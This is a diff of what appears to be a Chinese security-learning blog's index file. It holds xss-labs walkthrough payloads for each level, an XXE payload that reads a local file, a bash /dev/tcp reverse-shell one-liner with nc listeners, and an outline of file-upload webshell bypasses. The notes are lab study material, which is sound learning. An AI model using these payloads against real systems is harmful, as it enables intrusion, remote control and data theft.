class="line">原文链接：https://blog.csdn.net/angry_program/article/details/104448524/</span><br></pre></td></tr></table></figure>
 
-<h3 id="2-level2-html实体化-lt-gt"><a href="#2-level2-html实体化-lt-gt" class="headerlink" title="2.level2(html实体化&lt;&gt;)"></a>2.level2(html实体化&lt;&gt;)</h3><p>输入level1中的值，发现&lt;&gt;被实体化了。</p>
-<p>构造input闭合</p>
-<p><code>&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
-<h3 id="3-level3-html实体化”-lt-gt"><a href="#3-level3-html实体化”-lt-gt" class="headerlink" title="3.level3(html实体化”&lt;&gt;)"></a>3.level3(html实体化”&lt;&gt;)</h3><p>经过试验单引号不会被转义</p>
-<p>构造onmouseover事件，即鼠标触碰到input标签即还行该事件</p>
-<p><code>&#39; onmouseover=javascript:alert(1) &#39;</code></p>
-<h3 id="4-level4-html实体化’-lt-gt"><a href="#4-level4-html实体化’-lt-gt" class="headerlink" title="4.level4(html实体化’&lt;&gt;)"></a>4.level4(html实体化’&lt;&gt;)</h3><p>很好，单引号、尖括号没了</p>
-<p><code>&quot; onmouseover=javascript:alert(1) &quot;</code></p>
-<h3 id="5-level5-伪协议"><a href="#5-level5-伪协议" class="headerlink" title="5.level5(伪协议)"></a>5.level5(伪协议)</h3><p>script、onmouserover等中间会加个_符号</p>
-<p>知识点：伪协议：在url中调用js方法，如Data伪协议与Javascript协议</p>
-<p><code>&quot;&gt;&lt;a href=javascript:alert(&quot;123&quot;)&gt;&quot;</code></p>
-<p>点击链接跳转即可</p>
-<p>参考：<a href="https://blog.csdn.net/qq_33181292/article/details/117251090?ops_request_misc=&request_id=&biz_id=102&utm_term=xss%E4%BC%AA%E5%8D%8F%E8%AE%AE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-117251090.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">XSS_伪协议与编码绕过_伪协议绕过_南部余额的博客-CSDN博客</a></p>
-<p>​		<a href="https://blog.csdn.net/K_ShenH/article/details/122765092?ops_request_misc=%7B%22request_id%22:%22168440472216800197061493%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168440472216800197061493&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-122765092-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss-labs&spm=1018.2226.3001.4187">xss-labs搭建及通关攻略_Lydia_Ha的博客-CSDN博客</a></p>
-<h3 id="6-level6-小写过滤"><a href="#6-level6-小写过滤" class="headerlink" title="6.level6(小写过滤)"></a>6.level6(小写过滤)</h3><p>在script的基础上，href、src、oneerror什么的中间也加符号了</p>
-<p>但没有大写过滤</p>
-<p><code>&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code></p>
-<h3 id="7-level7-标签名过滤"><a href="#7-level7-标签名过滤" class="headerlink" title="7.level7(标签名过滤)"></a>7.level7(标签名过滤)</h3><p>src啊,&lt;&gt;script啊都被删了、on啊</p>
-<p>双写绕过</p>
-<p><code>&quot;&gt;&lt;SCRscriptIPT&gt;alert(1)&lt;/SCRscriptIPT&gt;</code></p>
-<h3 id="8-level8-unicode编码"><a href="#8-level8-unicode编码" class="headerlink" title="8.level8(unicode编码)"></a>8.level8(unicode编码)</h3><p>它把输入框的值放在了a标签的href里</p>
-<p>scr字符后面会放_符号，且大写会被转化为小写</p>
-<p>引号也实体化了</p>
-<p>将代码进行unicode编码即可</p>
-<p>如<code>javascript:alert(1)</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure>
+<p>注意事项：</p>
+<p>xml里大小写严格区分；</p>
+<p>且只有一个根元素（包含所有其他元素，如students）</p>
+<p>黑盒可以通过抓包后查看数据格式类型和Content-Type值(text&#x2F;xml、application&#x2F;xml)判断；</p>
+<p>更改Content-Type，查看返回</p>
+<h4 id="自定义实体语法"><a href="#自定义实体语法" class="headerlink" title="自定义实体语法"></a><strong>自定义实体语法</strong></h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素[</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY 实体名 <span class="string">&quot;实体内容&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"> ]&gt;</span></span><br><span class="line"></span><br><span class="line">引用已定义的实体：</span><br><span class="line"></span><br><span class="line">　　　　&amp;实体名;</span><br></pre></td></tr></table></figure>
 
-<p><a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
-<h3 id="level9-继续过滤"><a href="#level9-继续过滤" class="headerlink" title="level9(继续过滤)"></a>level9(继续过滤)</h3><p>还是把输入框的值放在了a标签的href里，但是unicode编码不能用咯</p>
-<p>知识点:strpos()查找字符串在另一字符串中第一次出现的位置。</p>
-<p>源码有strpos函数过滤，限制输入内容必须有http:&#x2F;&#x2F;</p>
-<p><code>javas&amp;#99;ript:alert(&#39;http://123&#39;)</code></p>
-<p>部分源码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">① 内部申明格式</span><br><span class="line">&lt;!DOCTYPE 根元素 [元素申明]&gt;</span><br><span class="line">DTD例子:  &lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">XML例子:  &lt;author&gt;&amp;writer;&lt;/author&gt;</span><br><span class="line">注释: 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">② 外部引用DTD格式</span><br><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;外部DTD的URI&quot;&gt;</span><br><span class="line">DTD例子:  &lt;!ENTITY writer SYSTEM &quot;http://www.***.com/dtd/entities.dtd&quot;&gt;</span><br><span class="line">XML例子:  &lt;author&gt;&amp;writer;&lt;/author&gt;</span><br><span class="line"> </span><br><span class="line">③ 引用公共DTD格式</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD标识名&quot; &quot;公共DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure>
 
-<h3 id="level10-隐藏参数"><a href="#level10-隐藏参数" class="headerlink" title="level10(隐藏参数)"></a>level10(隐藏参数)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
 
-<p>url被符号实体化了。</p>
-<p>从t_sort输入框下手，仅仅替换了尖括号。</p>
-<p>给input加一个onclick事件</p>
-<p>如<code>onclick=alert(1)</code></p>
-<p>记得去掉type的hide属性</p>
-<h3 id="level11-Referer"><a href="#level11-Referer" class="headerlink" title="level11(Referer)"></a>level11(Referer)</h3><p>同level10</p>
-<p>但是应该不对，怎么会有同一种解法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
 
-<p>第四行明显是说Reffer</p>
-<p>bp时</p>
-<p><code>Referer:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520113437383.png" alt="image-20230520113437383"></p>
-<h3 id="level12（代理）"><a href="#level12（代理）" class="headerlink" title="level12（代理）"></a>level12（代理）</h3><p>f12，看得t_ua</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="读文件内容"><a href="#读文件内容" class="headerlink" title="读文件内容"></a>读文件内容</h5><h6 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version =&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY xxe SYSTEM &quot;file:///d:/1.txt&quot;&gt;</span><br><span class="line"> </span><br><span class="line"> ]&gt;</span><br><span class="line"></span><br><span class="line"> &lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
 
-<p>bp时，很明显是</p>
-<p><code>User-Agent:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
-<h3 id="level13-Cookie"><a href="#level13-Cookie" class="headerlink" title="level13(Cookie)"></a>level13(Cookie)</h3><p>f12，看到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;t_cook&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这应该提示了cookie</p>
-<p>bp试试</p>
-<p><code>Cookie: user=&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
-<h3 id="level14-exif"><a href="#level14-exif" class="headerlink" title="level14(exif)"></a>level14(exif)</h3><p>待解决</p>
-<h3 id="level15-ngInclude"><a href="#level15-ngInclude" class="headerlink" title="level15(ngInclude)"></a>level15(ngInclude)</h3><p>url:</p>
-<p><code>http://localhost:81/xss-labs/level15.php?src=1.gif</code></p>
-<p>f12出现这个：</p>
-<p><img src="/../../../Typora/img111/image-20230520133632333.png" alt="image-20230520133632333"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>知识点：ng-include</p>
-<p>ng-include是angular js的东西，类似php函数中的include函数，即包含文件。</p>
-<p>1、ng-include 指令用于包含外部的 HTML文件。</p>
-<p>2、包含的内容将作为指定元素的子节点。</p>
-<p>3、ng-include 属性的值可以是一个表达式，返回一个文件名。</p>
-<p>4、默认情况下，包含的文件需要包含在同一个域名下。</p>
-<p>值得注意的是：</p>
-<p>ng-include,如果单纯指定地址，必须要加引号</p>
-<p>ng-include,加载外部html，script标签中的内容不执行</p>
-<p>ng-include,加载外部html中含有style标签样式可以识别<br>参考：<a href="https://blog.csdn.net/RuoLi_s/article/details/112690177?ops_request_misc=&request_id=&biz_id=102&utm_term=xss-labs%E9%80%9A%E5%85%B3&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-112690177.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187">xss-labs通关挑战（xss challenge）_RuoLi_s的博客-CSDN博客</a></p>
-<p>把其他存在xss漏洞的文件包含进来。</p>
-<p><code>src=&#39;level1.php?name=&lt;a href=javascript:alert(1)&gt;&#39;</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520135939252.png" alt="image-20230520135939252"></p>
-<h3 id="level16-空格绕过"><a href="#level16-空格绕过" class="headerlink" title="level16(空格绕过)"></a>level16(空格绕过)</h3><p>源代码为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>主要是script替换了，空格实体化了，”&#x2F;“也没了</p>
-<p>试试img，并且替换个空格</p>
-<p>%0a试试。</p>
-<p><code>keyword=</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520142552842.png" alt="image-20230520142552842"></p>
-<h3 id="level17-18-参数拼接"><a href="#level17-18-参数拼接" class="headerlink" title="level17-18(参数拼接)"></a>level17-18(参数拼接)</h3><p>url两个参数，中间有&#x3D;</p>
-<p><code>arg01=%20onmouseover&amp;arg02=alert(1)</code></p>
-<p>onmouseover前加个空格</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520154125903.png" alt="image-20230520154125903"></p>
-<p>level18同理。</p>
-<h3 id="level19-20-Flash反编译"><a href="#level19-20-Flash反编译" class="headerlink" title="level19-20(Flash反编译)"></a>level19-20(Flash反编译)</h3><p>待解决</p>
-]]></content>
+<p>这是一种外部实体应用方法</p>
+<h6 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h6><p>。。。</p>
+<h5 id="内网探针或攻击内网应用-触发漏洞地址"><a href="#内网探针或攻击内网应用-触发漏洞地址" class="headerlink" title="内网探针或攻击内网应用(触发漏洞地址)"></a>内网探针或攻击内网应用(触发漏洞地址)</h5><h5 id="RCE执行"><a href="#RCE执行" class="headerlink" title="RCE执行"></a>RCE执行</h5><p>安装了expect扩展的php环境里执行系统命令</p>
+<h5 id="引入外部实体dtd"><a href="#引入外部实体dtd" class="headerlink" title="引入外部实体dtd"></a>引入外部实体dtd</h5>]]></content>
       <categories>
-        <category>xss</category>
+        <category>xxe</category>
+        <category>xml</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
-        <tag>xss</tag>
+        <tag>xxe</tag>
+        <tag>xml</tag>
       </tags>
   </entry>
   <entry>
-    <title>在线网址</title>
-    <url>/2023/05/13/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/</url>
-    <content><![CDATA[<h2 id="一、在线工具"><a href="#一、在线工具" class="headerlink" title="一、在线工具"></a>一、在线工具</h2><p><a href="https://c.runoob.com/compile/1/">PHP 在线工具 | 菜鸟工具 (runoob.com)</a></p>
-<p><a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64 编码&#x2F;解码 - 在线工具 (toolhelper.cn)</a></p>
-<p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
-<p><a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
-<h2 id="二、学习网址"><a href="#二、学习网址" class="headerlink" title="二、学习网址"></a>二、学习网址</h2><p><a href="https://www.freebuf.com/column/195521.html">https://www.freebuf.com/column/195521.html</a></p>
-<p><a href="http://xiaodi8.com/?id=25">http://xiaodi8.com/?id=25</a></p>
-<p><a href="https://xz.aliyun.com/t/6103">https://xz.aliyun.com/t/6103</a></p>
-<p><a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></p>
-<p>[Nessus安装与使用_nessus安装使用教程_@Camelus的博客-CSDN博客](<a href="https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&request_id=&biz_id=102&utm_term=windows">https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=windows</a> nessus安装&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-1-126803631.142^v87^control_2,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
-<p><a href="https://bbs.zkaq.cn/">Track 安全社区 — 掌控安全在线教育- Track 知识社区 - 掌控安全在线教育 - Powered by 掌控者 (zkaq.cn)</a></p>
-<p><a href="https://overthewire.org/wargames/natas/natas9.html">OverTheWire: Natas Level 8 → Level 9</a></p>
-<p><a href="https://www.52pojie.cn/forum.php">吾爱破解 - LCG - LSG|安卓破解|病毒分析|www.52pojie.cn</a></p>
-<p><a href="https://blog.csdn.net/weixin_44211968/article/details/124696627?ops_request_misc=%7B%22request_id%22:%22168441788816800211527620%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168441788816800211527620&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124696627-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7&spm=1018.2226.3001.4187">【Web 安全】XSS 攻击详解_xss攻击_想变厉害的大白菜的博客-CSDN博客</a></p>
-<p>pikachu靶场 <a href="http://t.csdn.cn/fhhlu">http://t.csdn.cn/fhhlu</a></p>
-<p>乌云社区</p>
-<p>先知社区</p>
-<h2 id="三、学习平台"><a href="#三、学习平台" class="headerlink" title="三、学习平台"></a>三、学习平台</h2><p>xss接收凭条:<a href="https://xss.pt/xss.php">https://xss.pt/xss.php</a></p>
-<p>dnslog平台:<a href="http://ceye.io/">http://ceye.io/</a></p>
-]]></content>
+    <title>反弹shell</title>
+    <url>/2023/05/31/%E5%8F%8D%E5%BC%B9shell/</url>
+    <content><![CDATA[<h2 id="1-参考文章"><a href="#1-参考文章" class="headerlink" title="1.参考文章"></a>1.参考文章</h2><p>版权声明：本文为CSDN博主「云淡.风轻」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45584159/article/details/111489653">https://blog.csdn.net/qq_45584159/article/details/111489653</a></p>
+<h2 id="2-shell"><a href="#2-shell" class="headerlink" title="2.shell"></a>2.shell</h2><p>shell就是实现用户命令的接口，通过该接口我们能实现对计算机的控制(root权限)， 而反弹shell就是将shell反弹给攻击者，从而达到让攻击者可以在自己的机器上执行shell命令， 从而操控受害者的计算机。</p>
+<h2 id="3-为什么要反弹shell"><a href="#3-为什么要反弹shell" class="headerlink" title="3.为什么要反弹shell"></a>3.为什么要反弹shell</h2><p>攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。</p>
+<p>以下情况无法正向连接：</p>
+<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
+<p>2.它的ip会动态改变，你不能持续控制。</p>
+<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
+<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
+<p> 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
+<h2 id="3-反弹前提"><a href="#3-反弹前提" class="headerlink" title="3.反弹前提"></a>3.反弹前提</h2><p>第一步：要有一个可以被监听的端口，通常使用nc命令。<br>eg：nc -lvp 6767</p>
+<p>解析：-l 监听，-v 输出交互或出错信息，-p 端口。nc是netcat的简写，可实现任意TCP&#x2F;UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口。</p>
+<p>第二步：要产生一个交互式的shell，使用bash -i</p>
+<p>解析：bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别， -i 这个参数表示的是产生交互式的shell</p>
+<p>第三步：我们为什么要监听一个端口，就是因为存在一个特殊设备文件(&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;root)，如果你在任何一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器(即攻击者(攻击者作为服务器，而受害者作为客户端，反弹shell就是让受害者主动与服务端-攻击者建立通信))的socket通信。</p>
+<p>特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 bash 实现的用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</p>
+<p>&#x2F;dev&#x2F;tcp|udp&#x2F;ip&#x2F;port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的。</p>
+<h2 id="4-重定向"><a href="#4-重定向" class="headerlink" title="4.重定向"></a>4.重定向</h2><p>有时候需要让文件内容输出到其他设备。</p>
+<p>（1）输入重定向 &lt; &lt;&lt;<br>（2）输出重定向 &gt; &gt;&gt;</p>
+<p>重定向就是针对文件描述符的操作</p>
+<h3 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h3><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1</p>
+<p>bash -i 产生一个bash交互环境</p>
+<p>&gt;&amp; 将联合符号前面的内容与后面结合然后一起重定向给后者</p>
+<p>&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 主机与目标机建立一个TCP连接</p>
+<p>0&gt;&amp;1 标准的输入与标准输出一起重定向给标准输出的内容</p>
+<h3 id="NC反弹"><a href="#NC反弹" class="headerlink" title="NC反弹"></a>NC反弹</h3><p>nc -lvnp 6666</p>
+<h3 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h3>]]></content>
       <categories>
-        <category>在线工具</category>
-        <category>学习网址</category>
+        <category>反弹shell</category>
+        <category>linux</category>
       </categories>
       <tags>
-        <tag>编译</tag>
-        <tag>加密解密</tag>
-        <tag>其它工具</tag>
-        <tag>学习网址</tag>
+        <tag>linux</tag>
+        <tag>反弹shell</tag>
       </tags>
   </entry>
   <entry>
@@ -1453,78 +1698,78 @@ echo $get
         <category>靶场演练</category>
       </categories>
       <tags>
-        <tag>sql注入</tag>
         <tag>靶场</tag>
         <tag>渗透测试</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
-    <title>文件上传综述</title>
-    <url>/2023/05/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%BC%E8%BF%B0/</url>
-    <content><![CDATA[<h2 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h2><p>文件上传<br>    初识<br>        意义<br>        危害<br>        查找&#x2F;判断方式<br>        注意点<br>        实际应用说明<br>    验证&#x2F;绕过<br>        前端<br>            JS类防护<br>        后端<br>            黑名单<br>                特殊解析后缀<br>                .htaccess解析<br>                大小写绕过<br>                点绕过<br>                空格绕过<br>                ::$$DATA绕过<br>                配合解析漏洞<br>                双后缀名绕过<br>            白名单<br>                MIME绕过<br>                %00截断：在url中%00表示ascii码的0，表示字符串结束。（php版本&lt;5.3.4吧）<br>                0x00截断<br>                0x0a截断<br>            内容及其他<br>                文件头检测<br>                二次渲染<br>                条件竞争<br>                突破getimagesize<br>                突破exif_imagetype<br>    漏洞&#x2F;修复<br>        解析漏洞<br>            IIS6&#x2F;7.X<br>            Apache<br>            Nginx<br>        CMS漏洞<br>            子主题 1<br>            子主题 2<br>            子主题 3<br>        其他漏洞<br>            编辑器漏洞<br>                fackeditor<br>                ewebeditor<br>                ckeditor<br>                kindedit<br>                …<br>            CVE漏洞<br>            安全修复<br>    WAF绕过<br>        safadog<br>        BT<br>        XXX云盾</p>
-<p><strong>利用思路</strong></p>
-<p>常规类</p>
-<p>​	扫描获取上传</p>
-<p>​	会员中心上传</p>
-<p>​	后台系统上传</p>
-<p>​	各种途径上传</p>
-<p>CMS类</p>
-<p>​	CMS源码</p>
-<p>编辑器类</p>
-<p>​	ckeditor</p>
-<p>​    ewebeditor<br>​			ckeditor<br>​			kindedit</p>
-<p>其他&#x2F;CVE</p>
-<p>​	平台审计</p>
-<p>​	第三方</p>
-<h2 id="1-基础与过滤方式"><a href="#1-基础与过滤方式" class="headerlink" title="1.基础与过滤方式"></a>1.基础与过滤方式</h2><p>是什么：程序对文件的上传没有全面的限制，导致用户可以上传一些超越用户权限的一些文件，如木马,shell脚本,病毒等。</p>
-<p>文件上传利用前提:1.能上传上去；2.文件能被解析；3.知道绝对<strong>路径</strong>且能访问 </p>
-<p>危害：获取到网站权限，进而获取数据。即通过该漏洞上传webshell后门。</p>
-<p>查找&#x2F;判断：1.目录扫描找到上传地址</p>
-<p>​					2.会员中心</p>
-<p>​					3.后台</p>
-<p>​					4.白盒：拿到源代码找漏洞</p>
-<p>注意点：拿到漏洞，要对漏洞类型进行区分</p>
-<p>实际应用说明：上传后门脚本获取网站权限</p>
-<h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><ul>
-<li>常规文件上传地址的获取说明	：工具扫描</li>
-<li>不同格式下的文件类型后门测试：这个要结合自己的木马类型，如果是php，你连接地址为..&#x2F;1.jpg，显示是不符合的。(.htacess另说)</li>
-<li>配合解析漏洞下的文件类型后门测试本地文件：上传+解析漏洞</li>
-<li>upload-labs</li>
-<li>CMS&#x2F;CVE上传漏洞复现</li>
-</ul>
